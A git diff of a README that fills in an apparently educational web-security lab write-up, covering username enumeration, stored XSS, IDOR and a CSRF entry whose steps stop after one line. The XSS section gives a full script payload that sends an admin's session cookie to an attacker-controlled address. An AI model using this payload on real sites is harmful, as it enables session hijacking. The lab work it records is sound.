@@ -82,16 +82,41 @@ This is possible because new PHPSESSID is not generated when a used logs into we
 
 ## Green
 
-Vulnerability #1: __________________
+Vulnerability #1: Username Enumeration<br />  
+    ![GIF Walkthrough](./img/G2.gif)<br />  
+    Steps to recreate:
+- On the Log In page try to bruteforce diffent usernames.
+- The usernames tha exist in the database will get the message "Log in was unsuccessful" in bald.  
+The error message is highlited in bald because a different CSS class is assigned to the error message for usernames that exit in the database.
 
-Vulnerability #2: __________________
+
+Vulnerability #2: Cross-Site Scripting (XSS)<br />  
+    ![GIF Walkthrough](./img/G1.gif)<br />  
+    Steps to recreate:
+- Go to the Contact page.
+- In the text area type the following script 
+  ```html
+    <script>var node = document.createElement('img');
+    node.src = "http://192.168.1.2:3000?cookie="+document.cookie;
+    document.getElementById("main-content").appendChild(node);</script>
+  ```
+- Submit the form
+- When admin checks the feeedback ```PHPSESSID``` will be sent to the http://192.168.1.2:3000 address as a GET parameter
 
 
 ## Red
 
-Vulnerability #1: __________________
+Vulnerability #1: Insecure Direct Object Reference (IDOR)<br />  
+    ![GIF Walkthrough](./img/R1.gif)<br />  
+    Steps to recreate:
+- Go to the "Find a Salesperson" page.
+- Click on one of the salespersons page.
+- Increment the number at the end of the URL.
 
-Vulnerability #2: __________________
+Vulnerability #2: Cross-Site Request Forgery (CSRF)<br />  
+    ![GIF Walkthrough](./img/R1.gif)<br />  
+    Steps to recreate:
+- Go to the "Find a Salesperson" page.
 
 
 ## Notes
